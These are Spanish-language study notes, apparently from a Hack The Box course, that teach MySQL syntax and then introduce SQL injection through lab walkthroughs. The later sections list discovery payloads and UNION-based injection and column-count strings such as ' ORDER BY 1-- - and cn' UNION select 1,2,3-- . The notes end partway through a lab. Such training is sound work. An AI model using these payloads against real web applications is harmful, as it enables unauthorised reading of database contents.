Este módulo introduce la inyección SQL a través de `MySQL`y es crucial aprender más sobre `MySQL`y SQL para comprender cómo funcionan las inyecciones SQL y utilizarlas correctamente. Por lo tanto, esta sección cubrirá algunos de los conceptos básicos y la sintaxis de MySQL/SQL, así como ejemplos utilizados en bases de datos MySQL/MariaDB.

## Línea de comandos

El `mysql`La utilidad se utiliza para autenticarse e interactuar con una base de datos MySQL/MariaDB. `-u`La bandera se utiliza para proporcionar el nombre de usuario y el `-p`bandera para la contraseña. El `-p`El parámetro flag debe pasarse vacío, por lo que se nos solicita que ingresemos la contraseña y no la pasamos directamente en la línea de comandos, ya que podría estar almacenada en texto plano en el archivo bash_history.

```BASH
mysql -u root -p
```

```BASH
mysql -u root -h docker.hackthebox.eu -P 3306 -p 
```

Nota: El puerto predeterminado de MySQL/MariaDB es (3306), pero se puede configurar a otro puerto. Se especifica con una `P` mayúscula, a diferencia de la `p` minúscula que se usa para las contraseñas.

Nota: Para seguir los ejemplos, intente usar la herramienta 'mysql' en su PwnBox para iniciar sesión en el sistema de gestión de bases de datos (DBMS) que se menciona en la pregunta al final de esta sección, utilizando su dirección IP y puerto. Use 'root' como nombre de usuario y 'password' como contraseña.

## Creación de una base de datos

se puede crear una nueva base de datos en MySQL mediante la intruccion.

```
CREATE DATABASE
```

MySQL espera que las consultas de línea de comandos terminen con un punto y coma. El ejemplo anterior creó una nueva base de datos llamada `users`. Podemos ver la lista de bases de datos con [SHOW DATABASES](https://dev.mysql.com/doc/refman/8.0/en/show-databases.html) y podemos cambiar a la `users`base de datos con el `USE` declaración:


```sql
mysql> SHOW DATABASES;
+--------------------+ 
| Database           | 
+--------------------+ 
| information_schema |
| mysql              | 
| performance_schema |
| sys                |
| users              | 
+--------------------+ 
mysql> USE users; Database changed`
```

## Tablas
Los sistemas de gestión de bases de datos (DBMS) almacenan los datos en forma de tablas. Una tabla se compone de filas horizontales y columnas verticales.La intersección de una fila y una columna se denomina celda.

Un tipo de dato define qué tipo de valor debe contener una columna. Algunos ejemplos comunes son: `numbers`, `strings`, `date`, `time`, y `binary data` creemos una tabla llamada `logins`Para almacenar datos de usuario, utilice la CREATE TABLE consulta SQL

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```

Se puede obtener una lista de tablas en la base de datos actual utilizando el `SHOW TABLES`declaración. Además, la palabra DESCRIBE se utiliza para listar la estructura de la tabla con sus campos y tipos de datos.

```sql
mysql> DESCRIBE logins;

+-----------------+--------------+
| Field           | Type         |
+-----------------+--------------+
| id              | int          |
| username        | varchar(100) |
| password        | varchar(100) |
| date_of_joining | date         |
+-----------------+--------------+
4 rows in set (0.00 sec)
```

## Propiedades de la tabla
Dentro del `CREATE TABLE`En la consulta, hay muchas propiedades Por ejemplo, podemos configurar la `id`columna para autoincrementar usando el `AUTO_INCREMENT`palabra clave que incrementa automáticamente el ID en uno cada vez que se agrega un nuevo elemento a la tabla

```sql
id INT NOT NULL AUTO_INCREMENT,
```

El `NOT NULL`La restricción garantiza que una columna en particular nunca se deje vacía, es decir, un campo obligatorio. También podemos usar la `UNIQUE`La restricción garantiza que el elemento insertado sea siempre único. Por ejemplo, si la usamos con el `username`columna, podemos asegurarnos de que no haya dos usuarios con el mismo nombre de usuario:

```sql
username VARCHAR(100) UNIQUE NOT NULL,
```

Otra palabra clave importante es la `DEFAULT`palabra clave, que se utiliza para especificar el valor predeterminado. Por ejemplo, dentro del `date_of_joining`columna, podemos establecer el valor predeterminado en NOW().

```SQL
 date_of_joining DATETIME DEFAULT NOW(),
```

Finalmente, una de las propiedades más importantes es `PRIMARY KEY`, que podemos usar para identificar de forma única cada registro en la tabla, haciendo referencia a todos los datos de un registro dentro de una tabla para bases de datos relacionales, como se discutió previamente en la sección anterior. Podemos hacer que `id`la columna `PRIMARY KEY`para esta tabla:

```sql
PRIMARY KEY (id)
```

## Sentencia INSERT

se utiliza para agregar nuevos registros a una tabla determinada. La instrucción sigue la siguiente sintaxis:

```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```

## Sentencia SELECT
La anterior sentencia nos permite recuperar información de una BDS

```SQL
SELECT * FROM table_name;
```

El símbolo de asterisco ()actúa como comodín y selecciona todas las columnas. `FROM`La palabra clave se utiliza para indicar la tabla de la que se desea seleccionar. También es posible visualizar los datos presentes en columnas específicas:

```SQL
SELECT column1, column2 FROM table_name;
```

La consulta anterior seleccionará únicamente los datos presentes en las columnas 1 y 2.

```SQL
mysql> SELECT * FROM logins;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)


mysql> SELECT username,password FROM logins;

+---------------+------------+
| username      | password   |
+---------------+------------+
| admin         | p@ssw0rd   |
| administrator | adm1n_p@ss |
| john          | john123!   |
| tom           | tom123!    |
+---------------+------------+
4 rows in set (0.00 sec)
```

## Declaración DROP
Podemos usar DROP para eliminar tablas y bases de datos del servidor.

```SQL
mysql> DROP TABLE logins;

Query OK, 0 rows affected (0.01 sec)


mysql> SHOW TABLES;

Empty set (0.00 sec)
```

## Declaración ALTER 

Finalmente, podemos usar ALTER para cambiar el nombre de cualquier tabla y cualquiera de sus campos, o para eliminar o agregar una nueva columna a una tabla existente. El siguiente ejemplo agrega una nueva columna. `newColumn` hacia `logins`tabla usando `ADD`:

```SQL
mysql> ALTER TABLE logins ADD newColumn INT; Query OK, 0 rows affected (0.01 sec)
```

Para cambiar el nombre de una columna, podemos usar `RENAME COLUMN`:

```SQL
mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn; Query OK, 0 rows affected (0.01 sec)
```

También podemos cambiar el tipo de datos de una columna con `MODIFY`:


```SQL
mysql> ALTER TABLE logins MODIFY newerColumn DATE; Query OK, 0 rows affected (0.01 sec)
```

Finalmente, podemos eliminar una columna usando `DROP`:

```SQL
mysql> ALTER TABLE logins DROP newerColumn; Query OK, 0 rows affected (0.01 sec)

```
Podemos utilizar cualquiera de las instrucciones anteriores con cualquier tabla existente, siempre que tengamos los privilegios suficientes para hacerlo.

## Declaración de UPDATE
Mientras `ALTER` se utiliza para cambiar las propiedades de una tabla, UPDATE y puede utilizarse para actualizar registros específicos dentro de una tabla, según ciertas condiciones. Su sintaxis general es:

```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```

```sql
mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;

Query OK, 3 rows affected (0.00 sec)
Rows matched: 3  Changed: 3  Warnings: 0


mysql> SELECT * FROM logins;

+----+---------------+-----------------+---------------------+
| id | username      | password        | date_of_joining     |
+----+---------------+-----------------+---------------------+
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 |
|  2 | administrator | change_password | 2020-07-02 11:30:50 |
|  3 | john          | change_password | 2020-07-02 11:47:16 |
|  4 | tom           | change_password | 2020-07-02 11:47:16 |
+----+---------------+-----------------+---------------------+
4 rows in set (0.00 sec)
```

## Laboratorio
¿Cuál es el número de departamento del departamento de 'Desarrollo'?

Realizamos la conexión a la BD por medio de MYSQL

```sql
mysql -u root -h 154.57.164.72 -P 31110 -p
Enter password: 
```

Realizamos la consulta de la BD disponible 

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

```

Usamos la tabla de la consulta en este caso  `employees` luego de esta en uso entramos a validar de nuevo  las tablas disponible 

```sql
MariaDB [(none)]> use employees;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
```
Se confirma la disponibilidad de la tabla disponible 
```sql
Database changed
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
8 rows in set (0.008 sec)

```

Seleccionamos la parte que deseamos consultar con la siguiente consulta  
```sql

MariaDB [employees]> select * from departments;
+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
| d009    | Customer Service   |
| d005    | Development        |
| d002    | Finance            |
| d003    | Human Resources    |
| d001    | Marketing          |
| d004    | Production         |
| d006    | Quality Management |
| d008    | Research           |
| d007    | Sales              |
+---------+--------------------+
9 rows in set (0.008 sec)

```

Con lo anterior ya contamos con la solicitud del laboratorio .

## Clasificación de datos   ORDER BY

Podemos ordenar los resultados de cualquier consulta utilizando ORDER BY y especificando la columna por la que ordenar.

```SQL
mysql> SELECT * FROM logins ORDER BY password;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

Por defecto, la ordenación se realiza en orden ascendente, pero también podemos ordenar los resultados por `ASC` o `DESC`:

```QL
mysql> SELECT * FROM logins ORDER BY password DESC; 
+----+---------------+------------+---------------------+ 
| id | username      | password   | date_of_joining     | 
+----+---------------+------------+---------------------+ 
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 | 
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 | 
|  3 | john          | john123!   | 2020-07-02 11:47:16 | 
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 | 
+----+---------------+------------+---------------------+ 
4 rows in set (0.00 sec)
```

También es posible ordenar por varias columnas, para tener una ordenación secundaria en caso de valores duplicados en una columna:

```SQL
mysql> SELECT * FROM logins ORDER BY password DESC, id ASC; 
+----+---------------+-----------------+---------------------+ 
| id | username      | password        | date_of_joining     | 
+----+---------------+-----------------+---------------------+ 
|  1 | admin         | p@ssw0rd        | 2020-07-02 00:00:00 | 
|  2 | administrator | change_password | 2020-07-02 11:30:50 | 
|  3 | john          | change_password | 2020-07-02 11:47:16 | 
|  4 | tom           | change_password | 2020-07-02 11:50:20 | 
+----+---------------+-----------------+---------------------+ 
4 rows in set (0.00 sec)`
```

---

## Resultados LIMIT

En caso de que nuestra consulta devuelva una gran cantidad de registros, podemos limit los resultados a lo que queremos solamente, usando `LIMIT`y el número de registros que queremos:

```SQL
mysql> SELECT * FROM logins LIMIT 2; 
+----+---------------+------------+---------------------+ 
| id | username      | password   | date_of_joining     | 
+----+---------------+------------+---------------------+ 
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 | 
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 | 
+----+---------------+------------+---------------------+ 
2 rows in set (0.00 sec)
```

Si quisiéramos LIMITAR los resultados con un desplazamiento, podríamos especificar el desplazamiento antes del recuento de LIMIT:

```SQL
mysql> SELECT * FROM logins LIMIT 1, 2; 
+----+---------------+------------+---------------------+ 
| id | username      | password   | date_of_joining     | 
+----+---------------+------------+---------------------+ 
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 | 
|  3 | john          | john123!   | 2020-07-02 11:47:16 | 
+----+---------------+------------+---------------------+ 
2 rows in set (0.00 sec)
```

Nota: el desplazamiento indica el orden del primer registro que se incluirá, comenzando desde 0. En el ejemplo anterior, comienza e incluye el segundo registro y devuelve dos valores.

---

## Cláusula WHERE

Para filtrar o buscar datos específicos, podemos usar condiciones con el `SELECT`instrucción que utiliza la [cláusula WHERE](https://dev.mysql.com/doc/refman/8.0/en/where-optimization.html) , para ajustar los resultados:

```SQL
SELECT * FROM table_name WHERE <condition>;
```

La consulta anterior devolverá todos los registros que cumplan la condición dada. Veamos un ejemplo:

```SQL
mysql> SELECT * FROM logins WHERE id > 1; 
+----+---------------+------------+---------------------+ 
| id | username      | password   | date_of_joining     | 
+----+---------------+------------+---------------------+ 
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 | 
|  3 | john          | john123!   | 2020-07-02 11:47:16 | 
|  4 | tom           | tom123!    | 2020-07-02 11:47:16 | 
+----+---------------+------------+---------------------+
3 rows in set (0.00 sec)
```

El ejemplo anterior selecciona todos los registros donde el valor de `id`es mayor que `1`. Como podemos ver, la primera fila con su `id`ya que el 1 se omitió de la salida. Podemos hacer algo similar para los nombres de usuario:

```SQL
mysql> SELECT * FROM logins where username = 'admin'; 
+----+----------+----------+---------------------+ 
| id | username | password | date_of_joining     | 
+----+----------+----------+---------------------+ 
|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 | 
+----+----------+----------+---------------------+ 
1 row in set (0.00 sec)
```

La consulta anterior selecciona el registro donde el nombre de usuario es `admin`Podemos usar el `UPDATE`Declaración para actualizar ciertos registros que cumplen una condición específica.

Nota: Los tipos de datos de cadena y fecha deben ir entre comillas simples (') o dobles ("), mientras que los números se pueden usar directamente.

---

## Cláusula LIKE

Otra cláusula SQL útil es LIKE , que permite seleccionar registros haciendo coincidir un patrón determinado. La siguiente consulta recupera todos los registros con nombres de usuario que comienzan con `admin`:

```SQL
mysql> SELECT * FROM logins WHERE username LIKE 'admin%'; 
+----+---------------+------------+---------------------+ 
| id | username      | password   | date_of_joining     | 
+----+---------------+------------+---------------------+ 
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 | 
|  4 | administrator | adm1n_p@ss | 2020-07-02 15:19:02 | 
+----+---------------+------------+---------------------+ 
2 rows in set (0.00 sec)
```

El `%`El símbolo actúa como comodín y coincide con todos los caracteres posteriores. `admin`Se utiliza para hacer coincidir cero o más caracteres. De manera similar, el `_`El símbolo se utiliza para coincidir con exactamente un carácter. La siguiente consulta coincide con todos los nombres de usuario que contienen exactamente tres caracteres, que en este caso fueron `tom`:


```SQL
mysql> SELECT * FROM logins WHERE username like '___'; 
+----+----------+----------+---------------------+ 
| id | username | password | date_of_joining     | 
+----+----------+----------+---------------------+ 
|  3 | tom      | tom123!  | 2020-07-02 15:18:56 | 
+----+----------+----------+---------------------+ 
1 row in set (0.01 sec)
```

## Laboratorio
¿Cuál es el apellido del empleado cuyo nombre comienza con "Bar" Y que fue contratado el 1 de enero de 1990?

Realizamos la conexión a la BD por medio de MYSQL

```sql
mysql -u root -h 154.57.164.72 -P 31110 -p
Enter password: 
```

Realizamos la consulta de la BD disponible 

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

```

Usamos la tabla de la consulta en este caso  `employees` luego de esta en uso entramos a validar de nuevo  las tablas disponible 

Ya contamos con la tabla disponible procedemos a seccionar las filas requeridas con los datos solicitados podemos aplicar LIKE para la búsqueda de información 

```sql
MariaDB [employees]> select * from employees where first_name like 'bar%';
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
|  10395 | 1960-02-23 | Bartek     | Nastansky | F      | 1989-06-05 |
|  10601 | 1956-08-10 | Barton     | Soicher   | F      | 1986-02-21 |
+--------+------------+------------+-----------+--------+------------+
3 rows in set (0.008 sec)

MariaDB [employees]>
```

Ya con la aplicación de este filtro tendremos un resumen dolo solicitado para mayor precisión podríamos realizar otra consulta por medio de AND .

```sql
select * from employees where first_name like 'bar%' and  hire_date like '1990%';
+--------+------------+------------+-----------+--------+------------+
| emp_no | birth_date | first_name | last_name | gender | hire_date  |
+--------+------------+------------+-----------+--------+------------+
|  10227 | 1953-10-09 | Barton     | Mitchem   | M      | 1990-01-01 |
+--------+------------+------------+-----------+--------+------------+
1 row in set (0.008 sec)
```

Con la consulta anterior ya contamos con la información requerida.

# Operadores SQL

A veces, las expresiones con una sola condición no son suficientes para satisfacer el requisito del usuario. Para ello, SQL admite operadores lógicos para usar múltiples condiciones a la vez. Los operadores lógicos más comunes son: `AND`, `OR`, y `NOT`.

## Operador AND

El `AND`El operador toma dos condiciones y devuelve `true` o `false`basado en su evaluación:

```SQL
condition1 AND condition2
```

El resultado de la `AND`la operación es `true`si y solo si ambos `condition1` y `condition2`evaluar a `true`:

```SQL
mysql> SELECT 1 = 1 AND 'test' = 'test'; 
+---------------------------+ 
| 1 = 1 AND 'test' = 'test' | 
+---------------------------+ 
|                         1 | 
+---------------------------+ 
1 row in set (0.00 sec) 

mysql> SELECT 1 = 1 AND 'test' = 'abc'; 
+--------------------------+ 
| 1 = 1 AND 'test' = 'abc' | 
+--------------------------+ 
|                        0 | 
+--------------------------+ 
1 row in set (0.00 sec)
```

En términos de MySQL, cualquier `non-zero`Se considera el valor `true`y normalmente devuelve el valor `1`para significar `true`. `0`se considera `false`Como podemos ver en el ejemplo anterior, la primera consulta devolvió `true`ya que ambas expresiones fueron evaluadas como `true`Sin embargo, la segunda consulta devolvió `false`como segunda condición `'test' = 'abc'` es `false`.

## Operador OR
El `OR`El operador también acepta dos expresiones y devuelve `true`cuando al menos uno de ellos evalúa `true`:

```SQL
mysql> SELECT 1 = 1 OR 'test' = 'abc'; 
+-------------------------+ 
| 1 = 1 OR 'test' = 'abc' | 
+-------------------------+ 
|                       1 | 
+-------------------------+ 

1 row in set (0.00 sec) 

mysql> SELECT 1 = 2 OR 'test' = 'abc'; 
+-------------------------+ 
| 1 = 2 OR 'test' = 'abc' | 
+-------------------------+ 
|                       0 | 
+-------------------------+ 

1 row in set (0.00 sec)`
```

Las consultas anteriores demuestran cómo la `OR`El operador funciona. La primera consulta se evaluó como `true`como condición `1 = 1` es `true`La segunda consulta tiene dos `false`condiciones, lo que resulta en `false` producción.

## Operador NOT
El `NOT`El operador simplemente activa un interruptor `boolean`valor es decir `true`se convierte en `false`y viceversa':

```SQL
mysql> SELECT NOT 1 = 1;

+-----------+
| NOT 1 = 1 |
+-----------+
|         0 |
+-----------+
1 row in set (0.00 sec)

mysql> SELECT NOT 1 = 2;

+-----------+
| NOT 1 = 2 |
+-----------+
|         1 |
+-----------+
1 row in set (0.00 sec)
```

Como se ve en los ejemplos anteriores, la primera consulta dio como resultado: `false`porque es el inverso de la evaluación de `1 = 1`, que es `true`, por lo tanto su inversa es `false`Por otro lado, la segunda consulta devolvió `true`, como el inverso de `1 = 2`'que es `false`' es `true`.

## Operador de símbolos 
El `AND`, `OR` y `NOT`Los operadores también pueden representarse como `&&`, `||` y `!`, respectivamente. A continuación se muestran los mismos ejemplos anteriores, utilizando los operadores de símbolos:

```sql
mysql> SELECT 1 = 1 && 'test' = 'abc';

+-------------------------+
| 1 = 1 && 'test' = 'abc' |
+-------------------------+
|                       0 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)

mysql> SELECT 1 = 1 || 'test' = 'abc';

+-------------------------+
| 1 = 1 || 'test' = 'abc' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set, 1 warning (0.00 sec)

mysql> SELECT 1 != 1;

+--------+
| 1 != 1 |
+--------+
|      0 |
+--------+
1 row in set (0.00 sec)
```

Aquí hay una lista de operaciones comunes y su precedencia

- División ( `/`), Multiplicación ( `*`), y Módulo ( `%`)
- Suma ( `+`) y resta ( `-`)
- Comparación ( `=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NO ( `!`)
- Y ( `&&`)
- O ( `||`)

## Laboratorio 
En la tabla 'títulos', ¿cuántos registros hay donde el número de empleado es mayor que 10000 O su título NO contiene la palabra 'ingeniero'?

Realizamos la conexión a la BD por medio de MYSQL

```sql
mysql -u root -h 154.57.164.72 -P 31110 -p
Enter password: 
```

Realizamos la consulta de la BD disponible 

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+

```

Usamos la tabla de la consulta en este caso  `employees` luego de esta en uso entramos a validar de nuevo  las tablas disponible 

para extraer la información solicitada podremos aplicar el siguiente filtro 

```sql
MariaDB [employees]> select count(*) from titles where emp_no > 10000 or title != 'engineer';
+----------+
| count(*) |
+----------+
|      654 |
+----------+
1 row in set (0.008 sec)
```

## Tipos de inyecciones SQL

Las inyecciones SQL se clasifican según cómo y dónde se obtiene su resultado.

![Diagrama de tipos de inyección SQL: en banda con unión y basada en errores, ciega con booleana y basada en tiempo, y fuera de banda](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/types_of_sqli.jpg)

En casos sencillos, el resultado tanto de la consulta prevista como de la nueva consulta puede imprimirse directamente en la interfaz, y podemos leerlo directamente. Esto se conoce como `In-band`La inyección SQL tiene dos tipos: `Union Based` y `Error Based`.

Con `Union Based`Inyección SQL, es posible que tengamos que especificar la ubicación exacta, 'es decir, la columna', que podemos leer, para que la consulta dirija la salida a imprimirse allí. En cuanto a `Error Based`inyección SQL, se utiliza cuando podemos obtener el `PHP` o `SQL`errores en el front-end, por lo que podemos provocar intencionadamente un error SQL que devuelva el resultado de nuestra consulta.

En casos más complicados, es posible que no obtengamos la salida impresa, por lo que podemos utilizar la lógica SQL para recuperar la salida carácter por carácter. Esto se conoce como `Blind`La inyección SQL tiene dos tipos: `Boolean Based` y `Time Based`.

Con `Boolean Based`Inyección SQL, podemos usar sentencias condicionales SQL para controlar si la página devuelve alguna salida, 'es decir, la respuesta a la consulta original', si nuestra sentencia condicional devuelve `true`En cuanto a `Time Based`Inyecciones SQL, utilizamos sentencias condicionales SQL que retrasan la respuesta de la página si la sentencia condicional devuelve `true`usando el `Sleep()` función.

Finalmente, en algunos casos, es posible que no tengamos acceso directo a la salida en absoluto, por lo que es posible que tengamos que dirigir la salida a una ubicación remota, 'es decir, un registro DNS', y luego intentar recuperarla desde allí. Esto se conoce como `Out-of-band`Inyección SQL.

En este módulo, nos centraremos únicamente en introducir las inyecciones SQL a través del aprendizaje sobre `Union Based`Inyección SQL.

## Descubrimiento de inyección SQL

Antes de comenzar a manipular la lógica de la aplicación web e intentar eludir la autenticación, primero debemos comprobar si el formulario de inicio de sesión es vulnerable a la inyección SQL. Para ello, intentaremos añadir una de las siguientes cargas útiles después de nuestro nombre de usuario y veremos si provoca algún error o altera el comportamiento de la página:

|Carga útil|Codificado en URL|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

Nota: En algunos casos, es posible que tengamos que usar la versión codificada en URL de la carga útil. Un ejemplo de esto es cuando colocamos nuestra carga útil directamente en la URL, es decir, en una solicitud HTTP GET.

## Clausula UNION
Hasta ahora, solo hemos estado manipulando la consulta original para subvertir la lógica de la aplicación web y eludir la autenticación, utilizando el `OR`operador y comentarios. Sin embargo, otro tipo de inyección SQL consiste en inyectar consultas SQL completas que se ejecutan junto con la consulta original. Esta sección lo demostrará utilizando MySQL. `Union`cláusula para hacer `SQL Union Injection`.

veamos el contenido de la `ports` mesa:

```
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```

A continuación, veamos el resultado de la `ships`tablas:

```SQL
mysql> SELECT * FROM ships; 
+----------+-----------+ 
| Ship     | city      | 
+----------+-----------+ 
| Morrison | New York  | 
+----------+-----------+ 

1 rows in set (0.00 sec)`
```

Ahora, intentemos usar `UNION`para combinar ambos resultados:

```SQL
mysql> SELECT * FROM ports UNION SELECT * FROM ships; 
+----------+-----------+ 
| code     | city      | 
+----------+-----------+ 
| CN SHA   | Shanghai  | 
| SG SIN   | Singapore | 
| Morrison | New York  | 
| ZZ-21    | Shenzhen  | 
+----------+-----------+ 

4 rows in set (0.00 sec)`
```

a declaración solo puede operar en `SELECT`declaraciones con el mismo número de columnas. Por ejemplo, si intentamos `UNION`Si realizamos dos consultas cuyos resultados tienen un número diferente de columnas, obtenemos el siguiente error:

```SQL
mysql> SELECT city FROM ports UNION SELECT * FROM ships;

ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

# Columnas Desiguales

Descubriremos que la consulta original normalmente no tendrá el mismo número de columnas que la consulta SQL que queremos ejecutar, por lo que tendremos que buscar una solución. Por ejemplo, supongamos que solo tenemos una columna. En ese caso, queremos `SELECT`, podemos poner datos basura para las columnas requeridas restantes de modo que el número total de columnas que tenemos sea `UNION`El resultado sigue siendo el mismo que la consulta original.

El `products`La tabla tiene dos columnas en el ejemplo anterior, por lo que tenemos que... `UNION`con dos columnas. Si solo quisiéramos obtener una columna, por ejemplo `username`', tenemos que hacerlo `username, 2`, de manera que tengamos el mismo número de columnas:

```
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

Si tuviéramos más columnas en la tabla de la consulta original, tendríamos que agregar más números para crear las columnas restantes requeridas. Por ejemplo, si la consulta original utilizaba `SELECT`sobre una mesa con cuatro columnas, nuestra `UNION`La inyección sería:

```sql
UNION SELECT username, 2, 3, 4 from passwords-- `
```

Esta consulta devolvería:

```sql
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- ' 
+-----------+-----------+-----------+-----------+ 
| product_1 | product_2 | product_3 | product_4 | 
+-----------+-----------+-----------+-----------+ 
|   admin   |    2      |    3      |    4      | 
+-----------+-----------+-----------+-----------+`
```

## Laboratorio
Conéctese al servidor MySQL mencionado anteriormente con la herramienta 'mysql' y averigüe la cantidad de registros que se devuelven al realizar una 'Unión' de todos los registros de la tabla 'employees' y todos los registros de la tabla 'departments'.

Realizamos la conexión a la BD por medio de MYSQL

```sql
mysql -u root -h 154.57.164.72 -P 31110 -p
Enter password: 
```

Realizamos la consulta de la BD disponible 

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| employees          |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

Entramos a usar la DB employees

```sql
MariaDB [(none)]> use employees;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [employees]>
```

Consultamos las tablas disponibles 

```sql
MariaDB [employees]> show tables;
+----------------------+
| Tables_in_employees  |
+----------------------+
| current_dept_emp     |
| departments          |
| dept_emp             |
| dept_emp_latest_date |
| dept_manager         |
| employees            |
| salaries             |
| titles               |
+----------------------+
```

ya contamos con las tablas disponibles procedemos a unir las dos tablas solicitadas  `employees` y `departments`

validamos la primera tabla 

```sql
MariaDB [employees]> SELECT * FROM employees;
+--------+------------+--------------+-----------------+--------+------------+
| emp_no | birth_date | first_name   | last_name       | gender | hire_date  |
+--------+------------+--------------+-----------------+--------+------------+
```

consulta 2 tabla

```sql
MariaDB [employees]> SELECT * FROM departments;
+---------+--------------------+
| dept_no | dept_name          |
+---------+--------------------+
```

Para realizar la unificación validamos  la siguiente consulta SQL 

```SQL
[employees]> SELECT * FROM employees UNION SELECT *,2,3,4,5 FROM departments;
+--------+--------------------+--------------+-----------------+--------+------------+
| emp_no | birth_date         | first_name   | last_name       | gender | hire_date  |
+--------+--------------------+--------------+-----------------+--------+------------+
| 10654  | 1958-05-01         | Sachin       | Tsukuda         | M      | 1997-11-30 |
| d009   | Customer Service   | 2            | 3               | 4      | 5          |
| d005   | Development        | 2            | 3               | 4      | 5          |
| d002   | Finance            | 2            | 3               | 4      | 5          |
| d003   | Human Resources    | 2            | 3               | 4      | 5          |
| d001   | Marketing          | 2            | 3               | 4      | 5          |
| d004   | Production         | 2            | 3               | 4      | 5          |
| d006   | Quality Management | 2            | 3               | 4      | 5          |
| d008   | Research           | 2            | 3               | 4      | 5          |
| d007   | Sales              | 2            | 3               | 4      | 5          |
+--------+--------------------+--------------+-----------------+--------+------------+
663 rows in set (0.018 sec)
```

otra alternativa que pude validar fue contar cada tabla  

```sql
MariaDB [employees]> SELECT COUNT(*) FROM employees UNION SELECT COUNT(*) FROM departments;
+----------+
| COUNT(*) |
+----------+
|      654 |
|        9 |
+----------+

```

## Detectar número de columnas

Antes de proceder a explotar las consultas basadas en Union, necesitamos averiguar el número de columnas seleccionadas por el servidor. Hay dos métodos para detectar el número de columnas:

- Usando `ORDER BY`
- Usando `UNION`

### Usando ORDER BY
La primera forma de detectar el número de columnas es a través de la `ORDER BY`función, que ya hemos comentado. Tenemos que insertar una consulta que ordene los resultados por una columna que hayamos especificado, es decir, columna 1, columna 2, etc., hasta que aparezca un error que indique que la columna especificada no existe.

```SQL
' order by 1-- -
```

### Usando UNION
El otro método consiste en intentar una inyección Union con un número diferente de columnas hasta obtener resultados satisfactorios. El primer método siempre devuelve resultados hasta que se produce un error, mientras que este método siempre genera un error hasta que se obtiene un resultado exitoso. Podemos comenzar inyectando una matriz de 3 columnas. `UNION` consulta:

```SQL
cn' UNION select 1,2,3-- 
```

## Laboratorio
Utilice una inyección de unión para obtener el resultado de 'user()'.

Validamos si contamos con acceso al laboratorio en la pagina web  primero realizamos un reconocimiento.

![](../../assets/images/SQLI/file-20260324125050725.jpg)

Consultamos donde se puede aplicar el SQLI

![](../../assets/images/SQLI/file-20260324125130637.jpg)

Si aplicamos una consulta en este caso la letra A obtendremos resultados en la tabla entramos a validar si es posible romper la consulta para inyectar código  arbitrario  

![](../../assets/images/SQLI/file-20260324125244364.jpg)

Tratamos de obtener el numero de columnas  ORDER BY

```sql
' ORDER BY 1-- - OK
' ORDER BY 1,2-- - OK
' ORDER BY 1,2,3-- - OK
' ORDER BY 1,2,3,4-- - OK
' ORDER BY 1,2,3,4,5-- - KO
etc.
```

